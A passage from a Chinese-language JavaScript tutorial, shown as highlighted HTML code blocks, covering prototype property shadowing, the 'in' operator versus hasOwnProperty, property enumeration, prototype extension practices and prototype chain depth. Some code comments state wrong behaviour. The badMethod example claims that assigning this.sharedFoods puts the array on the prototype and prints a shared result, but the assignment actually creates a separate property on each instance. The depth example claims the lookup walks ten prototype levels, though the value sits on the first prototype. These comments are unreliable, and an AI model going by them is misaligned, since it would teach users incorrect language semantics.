<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
    consInstances.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestConstructor</span>(<span class="hljs-string">`实例<span class="hljs-subst">${i}</span>`</span>));
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"构造函数模式"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"原型模式"</span>);
<span class="hljs-keyword">const</span> protoInstances = [];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
    protoInstances.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestPrototype</span>(<span class="hljs-string">`实例<span class="hljs-subst">${i}</span>`</span>));
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"原型模式"</span>);
</code></pre>
<h3 data-id="heading-38">4.4 属性访问的优先级和查找</h3>
<h4 data-id="heading-39">4.4.1 属性遮蔽（Property Shadowing）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span> = <span class="hljs-string">"普通猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">color</span> = <span class="hljs-string">"未知"</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 属性遮蔽实验 ==="</span>);

<span class="hljs-comment">// 1. 初始状态：访问原型属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "普通猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);        <span class="hljs-comment">// "未知"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. 在实例上添加同名属性（遮蔽）</span>
cat.<span class="hljs-property">type</span> = <span class="hljs-string">"超级猫"</span>;
cat.<span class="hljs-property">color</span> = <span class="hljs-string">"白色"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n遮蔽后 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "超级猫"（实例属性）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);          <span class="hljs-comment">// "白色"（实例属性）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 3. 原型属性仍然存在</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n原型属性 - Cat.prototype.type:"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span>);  <span class="hljs-comment">// "普通猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"原型属性 - Cat.prototype.color:"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">color</span>);  <span class="hljs-comment">// "未知"</span>

<span class="hljs-comment">// 4. 删除实例属性（解除遮蔽）</span>
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">type</span>;
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">color</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n删除后 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "普通猫"（又访问到原型）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);          <span class="hljs-comment">// "未知"（又访问到原型）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<h4 data-id="heading-40">4.4.2 <code>in</code> 操作符 vs <code>hasOwnProperty</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== in 和 hasOwnProperty 的区别 ==="</span>);

<span class="hljs-comment">// 1. hasOwnProperty：只检查对象自身属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('name'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"name"</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('species'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"species"</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('toString'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"toString"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. in 操作符：检查整个原型链</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n'name' in cat:"</span>, <span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> cat);         <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'species' in cat:"</span>, <span class="hljs-string">"species"</span> <span class="hljs-keyword">in</span> cat);     <span class="hljs-comment">// true（在原型链上找到）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'toString' in cat:"</span>, <span class="hljs-string">"toString"</span> <span class="hljs-keyword">in</span> cat);   <span class="hljs-comment">// true（在Object.prototype上）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'notExist' in cat:"</span>, <span class="hljs-string">"notExist"</span> <span class="hljs-keyword">in</span> cat);   <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 3. 实用函数：区分自身属性和继承属性</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getPropertySource</span>(<span class="hljs-params">obj, prop</span>) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(prop)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"自身属性"</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"原型链继承"</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"不存在"</span>;
    }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n属性来源分析："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"name:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"name"</span>));       <span class="hljs-comment">// 自身属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"species:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"species"</span>)); <span class="hljs-comment">// 原型链继承</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"toString:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"toString"</span>)); <span class="hljs-comment">// 原型链继承</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"age:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"age"</span>));         <span class="hljs-comment">// 不存在</span>
</code></pre>
<h4 data-id="heading-41">4.4.3 遍历属性的不同方法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {};

<span class="hljs-comment">// 在原型链上添加不可枚举属性</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">"hidden"</span>, {
    <span class="hljs-attr">value</span>: <span class="hljs-string">"隐藏属性"</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
});

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>, <span class="hljs-string">"白色"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 不同遍历方法的区别 ==="</span>);

<span class="hljs-comment">// 1. for...in：遍历所有可枚举属性（包括原型链）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"for...in 遍历："</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> cat) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  <span class="hljs-subst">${key}</span>: <span class="hljs-subst">${cat[key]}</span>`</span>);
}
<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">//   name: 咪咪</span>
<span class="hljs-comment">//   color: 白色</span>
<span class="hljs-comment">//   species: 猫</span>
<span class="hljs-comment">//   eat: function() {}</span>

<span class="hljs-comment">// 2. Object.keys()：只遍历自身可枚举属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\nObject.keys()："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-comment">// 3. Object.getOwnPropertyNames()：自身所有属性（包括不可枚举）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\nObject.getOwnPropertyNames()："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-comment">// 4. 获取所有属性（包括原型链的）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getAllProperties</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">const</span> props = {};
    
    <span class="hljs-comment">// 遍历原型链</span>
    <span class="hljs-keyword">let</span> current = obj;
    <span class="hljs-keyword">while</span> (current &amp;&amp; current !== <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(current).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (!props[prop] &amp;&amp; prop !== <span class="hljs-string">"constructor"</span>) {
                props[prop] = {
                    <span class="hljs-attr">value</span>: current[prop],
                    <span class="hljs-attr">own</span>: current === obj,
                    <span class="hljs-attr">enumerable</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(current, prop).<span class="hljs-property">enumerable</span>
                };
            }
        });
        current = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(current);
    }
    
    <span class="hljs-keyword">return</span> props;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n所有属性分析："</span>);
<span class="hljs-keyword">const</span> allProps = <span class="hljs-title function_">getAllProperties</span>(cat);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prop <span class="hljs-keyword">in</span> allProps) {
    <span class="hljs-keyword">const</span> info = allProps[prop];
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${prop}</span>: <span class="hljs-subst">${info.own ? <span class="hljs-string">"自身"</span> : <span class="hljs-string">"继承"</span>}</span> <span class="hljs-subst">${info.enumerable ? <span class="hljs-string">"可枚举"</span> : <span class="hljs-string">"不可枚举"</span>}</span>`</span>);
}
</code></pre>
<h3 data-id="heading-42">4.5 原型模式的最佳实践</h3>
<h4 data-id="heading-43">4.5.1 安全的原型扩展</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不安全的写法：直接覆盖prototype</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// ❌ 不推荐：完全覆盖prototype，丢失constructor</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>().<span class="hljs-property">constructor</span>); <span class="hljs-comment">// Object，不是Cat！</span>

<span class="hljs-comment">// ✅ 推荐写法1：逐个添加</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
};

<span class="hljs-comment">// ✅ 推荐写法2：使用Object.assign，但保留constructor</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, {
    <span class="hljs-comment">// 显式设置constructor</span>
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    }
});

<span class="hljs-comment">// ✅ 推荐写法3：使用class（ES6）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
    
    <span class="hljs-title function_">eat</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
    
    <span class="hljs-title function_">sleep</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    }
}
</code></pre>
<h4 data-id="heading-44">4.5.2 原型方法的注意事项</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">foods</span> = []; <span class="hljs-comment">// 引用类型属性</span>
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-comment">// ✅ 正确：使用this访问实例属性</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">foods</span>.<span class="hljs-title function_">push</span>(food);
    },
    
    <span class="hljs-comment">// ❌ 危险：在原型方法中修改共享状态</span>
    <span class="hljs-attr">badMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 如果访问Cat.prototype上的属性，会影响到所有实例！</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span> = []; <span class="hljs-comment">// 这会在原型上创建属性！</span>
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">"鱼"</span>);
    },
    
    <span class="hljs-comment">// ✅ 正确：使用闭包创建私有变量</span>
    <span class="hljs-attr">getCounter</span>: (<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> privateCounter = <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            privateCounter++;
            <span class="hljs-keyword">return</span> privateCounter;
        };
    })()
};

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫1"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫2"</span>);

cat1.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"鱼"</span>);
cat2.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"肉"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">foods</span>); <span class="hljs-comment">// ["鱼"]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">foods</span>); <span class="hljs-comment">// ["肉"]</span>

cat1.<span class="hljs-title function_">badMethod</span>();
cat2.<span class="hljs-title function_">badMethod</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">sharedFoods</span>); <span class="hljs-comment">// ["鱼", "肉"] </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">sharedFoods</span>); <span class="hljs-comment">// ["鱼", "肉"] </span>
<span class="hljs-comment">// 注意：sharedFoods实际上在原型上，两个实例共享！</span>
</code></pre>
<h4 data-id="heading-45">4.5.3 原型链的深度控制</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 原型链不宜过深，一般建议不超过3层</span>
<span class="hljs-comment">// 猫 → 动物 → 生物 → Object.prototype → null （5层，已较深）</span>

<span class="hljs-comment">// 过深原型链的性能问题</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"创建深层原型链"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level1</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level2</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level3</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level4</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level5</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level6</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level7</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level8</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level9</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level10</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Level2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level1</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level3</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level4</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level3</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level4</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level6</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level7</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level6</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level8</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level7</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level9</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level8</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level10</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level9</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

<span class="hljs-title class_">Level10</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-string">"在最底层"</span>;

<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Level10</span>();

<span class="hljs-comment">// 查找value需要遍历10层原型链！</span>
<span class="hljs-keyword">let</span> value = obj.<span class="hljs-property">value</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"创建深层原型链"</span>);

<span class="hljs-comment">// 性能测试：多次访问</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"访问深层属性10000次"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
    <span class="hljs-keyword">const</span> temp = obj.<span class="hljs-property">value</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"访问深层属性10000次"</span>);

<span class="hljs-comment">// 对比：浅层原型链</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Shallow</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Shallow</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">value</span> = <span class="hljs-string">"在原型上"</span>;
<span class="hljs-keyword">const</span> shallowObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shallow</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"访问浅层属性10000次"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
    <span class="hljs-keyword">const</span> temp = shallowObj.<span class="hljs-property">value</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"访问浅层属性10000次"</span>);
</code></pre>
<h3 data-id="heading-46">4.6 原型模式的实际应用</h3>
<h4 data-id="heading-47">4.6.1 插件系统设计</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用原型模式实现可扩展的插件系统</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PluginSystem</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = {};
}

<span class="hljs-title class_">PluginSystem</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">PluginSystem</span>,
    
